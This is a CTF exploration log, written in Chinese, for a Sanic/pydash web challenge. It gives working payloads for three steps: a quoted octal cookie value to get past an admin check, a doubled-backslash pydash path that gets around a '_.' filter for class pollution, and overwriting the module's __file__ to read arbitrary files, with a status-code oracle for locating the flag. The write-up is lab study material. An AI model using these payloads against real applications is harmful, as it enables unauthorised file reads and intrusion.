# a-13 · 探索记录

对应题解：[`a-13.md`](./a-13.md)。

## 目标与起点

题面直接给了三段：「Cookie 八进制编码绕过、pydash 路径解析绕过、最终任意文件读」。

启动后首页只有 `/src` 和 `/flag` 两个链接。`/src` 是整个应用的源码，白盒。

## 第一阶段：读源码

`/src` 返回完整文件（Sanic + sanic_session + pydash）。要点：

```python
# 登录：只比较 cookie 的字符串
if user and user.lower() == 'adm;n': session['admin'] = True

# 污染：只挡 '_.'，key 必须是 str
if key and value and type(key) is str and '_.' not in key:
    pydash.set_(Pollute(), key, value)

# flag：admin 时只给提示
return text("Find the flag! Hint: Check /src and use pollution")

# 关键的一行
@app.route("/src")
async def src(request): return text(open(__file__).read())
```

`/src` 用 `open(__file__)`，而 `Pollute.__init__.__globals__` 是同一个模块的 globals —— 这让「污染 `__file__`」成为一个不用 RCE 的任意文件读。

## 第二阶段：Cookie 八进制（三次失败）

目标值 `adm;n`，但分号在 Cookie 里是分隔符。

| 尝试 | 结果 | 原因 |
| --- | --- | --- |
| `Cookie: user=adm;n` | login fail | 解析成 `user=adm` + `n` |
| `Cookie: user=adm\073n` | login fail | 无引号时 SimpleCookie 不解析八进制 |
| `Cookie: user=adm%3Bn` | login fail | Cookie 值不做 URL 解码 |
| **`Cookie: user="adm\073n"`** | **login success** | 带引号 + 八进制转义 |

本地验证一下就很清楚：

```python
SimpleCookie('user=adm\\073n')    # {}
SimpleCookie('user="adm\\073n"')  # {'user': 'adm;n'}
```

登录后拿到 `session=<32 位 hex>`，`/flag` 返回提示文本。

## 第三阶段：pydash 路径绕过（核心，试了四种写法）

过滤器只有一条：`'_.' not in key`。所以任意 `__xxx__.` 都被挡。先试了四种写法：

| key | `'_.' in key` | `pydash.to_path(key)` | 结果 |
| --- | --- | --- | --- |
| `__class__.__init__.__globals__` | True | — | 被过滤 |
| `__class__["__init__"]["__globals__"]` | False | `['__class__["__init__"]["__globals__"]']` | 不切分，写不到 |
| `__class__[__init__][__globals__]` | False | 单段 | 同上 |
| `__class__\\.__init__`（单反斜杠） | False | `['__class__.__init__']` | 不切分 |
| `__class__\\\\.__init__`（双反斜杠） | False | `['__class__', '__init__']` | **切分成功** |

然后读 pydash 的切分正则：

```
(?<!\\)(?:\\\\)*\.|(\[\d+\])
```

- `\.`（一个反斜杠）被 lookbehind 挡住，不匹配 → 点被转义成字面量。
- `\\.`（两个反斜杠）里，`(?:\\\\)*` 先吃掉这对反斜杠，再匹配点 → **切分**，并且 `unescape_path_key` 只把 `\\` 还原成 `\`、`\.` 还原成 `.`，所以段名是干净的。

本地用同样的 pydash 版本验证：

```python
class P:
    def __init__(self): pass
k = '__class__\\\\.__init__\\\\.__globals__\\\\.__file__'
print('_.' in k)                 # False
print(pydash.to_path(k))          # ['__class__', '__init__', '__globals__', '__file__']
pydash.set_(P(), k, '/etc/hostname')
print(P.__init__.__globals__['__file__'])   # /etc/hostname
```

## 第四阶段：从污染到 flag

先在应用上验证原语：

```bash
POST /admin  {"key":"__class__\\\\.__init__\\\\.__globals__\\\\.__file__","value":"/etc/hostname"}
→ success

GET /src
→ b1bcc8936f09     （不再是源码，说明读的是 hostname）
```

然后逐个试 flag 路径，用 `/src` 的 200/500 当存在性 oracle：

| `__file__` 值 | `/src` | 结论 |
| --- | --- | --- |
| `/flag` | 500 | 文件不存在（`/flag` 只是路由） |
| `/flag.txt` | 500 | 不存在 |
| `/app/flag.txt` | 500 | 不存在 |
| `/root/flag.txt` | 500 | 不存在 |
| `/tmp/flag` | 500 | 不存在 |
| **`/challenge/flag.txt`** | **200** | flag{fdd7004b-...} |

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `Cookie: user=adm;n` | 登录失败 | 分号被当作 cookie 分隔符 |
| `user=adm\073n`（无引号） | 登录失败 | SimpleCookie 只对带引号值解八进制 |
| `user=adm%3Bn` | 登录失败 | 不做 URL 解码 |
| `__class__.__init__...` | forbidden | `'_.'` 过滤 |
| 方括号路径 `["__init__"]` | 无效果 | `to_path` 不解析非数字方括号 |
| 单反斜杠 `\.` | 无效果 | 点被转义成字面量 |
| `a/\.b` 之类其它分隔符 | 无效果 | `to_path` 只认点和数字方括号 |
| 替换 `open` | 不可行 | 值只能是字符串，替换后调用会崩 |
| 无数个 flag 路径 | 500 | `open` 抛异常，说明路径不存在 |

## 这次真正的收获

1. **`/src` 自曝源码的路由等于白盒**：漏洞点、过滤器边界、可利用的全局变量都在里面。
2. **Cookie 的八进制转义只在带引号时生效**。`user="adm\073n"` 是绕过「值里不能有分号」的标准手法。
3. **过滤 `_.` 是字符串过滤，不是路径过滤。** 只要找到一种「原始串不含 `_.`、解析后仍按点切分」的写法就能过；`\\.` 正是这种写法（正则消耗成对反斜杠）。
4. **污染的目标要选「现有代码已经在用的名字」**。改 `__file__` 比替换 `open` 靠谱得多——后者值类型不对，前者直接改路径。
5. **`open()` 抛异常 = 500**，这本身就是文件存在性 oracle，比盲猜路径高效。
